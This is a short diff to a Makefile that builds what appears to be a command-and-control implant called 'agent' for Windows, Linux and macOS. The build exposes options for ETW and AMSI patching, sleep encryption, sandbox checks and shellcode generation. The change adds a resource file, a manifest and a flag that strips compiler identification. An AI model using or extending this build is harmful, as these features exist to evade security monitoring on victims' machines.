@@ -49,7 +49,8 @@ ENABLE_ENV_CLEAN     ?= 1
 ENABLE_SANDBOX_CHECK ?= 1
 
 # ── Windows flags ──
-WIN_CFLAGS  = -Wall -Wextra -O2 -s -D_WIN32_WINNT=0x0600 -static-libgcc $(COMMON_DEFS)
+WIN_CC_RES = x86_64-w64-mingw32-windres
+WIN_CFLAGS  = -Wall -Wextra -O2 -s -fno-ident -D_WIN32_WINNT=0x0600 -static-libgcc $(COMMON_DEFS)
 WIN_CFLAGS += -DENABLE_ETW_PATCH=$(ENABLE_ETW_PATCH)
 WIN_CFLAGS += -DENABLE_AMSI_PATCH=$(ENABLE_AMSI_PATCH)
 WIN_CFLAGS += -DENABLE_SLEEP_ENCRYPT=$(ENABLE_SLEEP_ENCRYPT)
@@ -102,8 +103,11 @@ gen_shellcode: gen_shellcode.c
 	$(CC) -O2 -o gen_shellcode gen_shellcode.c
 
 # ── Windows targets ──
-exe:
-	$(WIN_CC) $(WIN_CFLAGS) -o agent.exe main.c $(WIN_LDFLAGS)
+agent_res.o: agent.rc agent.manifest
+	$(WIN_CC_RES) agent.rc -o agent_res.o
+
+exe: agent_res.o
+	$(WIN_CC) $(WIN_CFLAGS) -o agent.exe main.c agent_res.o $(WIN_LDFLAGS)
 
 dll:
 	$(WIN_CC) $(WIN_CFLAGS) -shared -DBUILD_DLL -o agent.dll main.c $(WIN_LDFLAGS)
@@ -139,4 +143,4 @@ all: exe linux-elf
 
 clean:
 	rm -f agent.exe agent.dll agent_pic.dll agent.bin agent_linux agent_macos agent_shellcode.o \
-	      gen_shellcode pic_stub.exe pic_stub.bin include/mtls_cert.h
+	      agent_res.o gen_shellcode pic_stub.exe pic_stub.bin include/mtls_cert.h
